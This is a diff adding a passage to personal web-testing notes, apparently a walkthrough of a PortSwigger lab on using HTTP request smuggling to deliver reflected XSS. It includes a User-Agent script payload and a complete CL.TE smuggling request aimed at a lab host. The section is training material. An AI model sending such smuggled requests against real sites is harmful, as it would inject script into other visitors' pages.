@@ -322,3 +322,43 @@ Modify to your copied session cookie and csrf token
 Forward request
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a0542cf1-3152-4445-b225-b23588691592)
 
+**Exploiting HTTP request smuggling to deliver reflected XSS**
+
+On the comment blog page we notice userAgent with the value of our browser 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2ab52e74-0e53-48d6-bc5a-20fb5a5bd4b9)
+
+
+
+
+Inject an XSS payload into the User-Agent header and observe that it gets reflected: 
+
+From <https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss> 
+```
+User-Agent: /><script>alert(1)</script>
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/eadf8a18-8521-4ae2-9cd0-5d9a1d242614)
+
+
+
+
+Exploit
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+Will trigger on the next visitor 
+
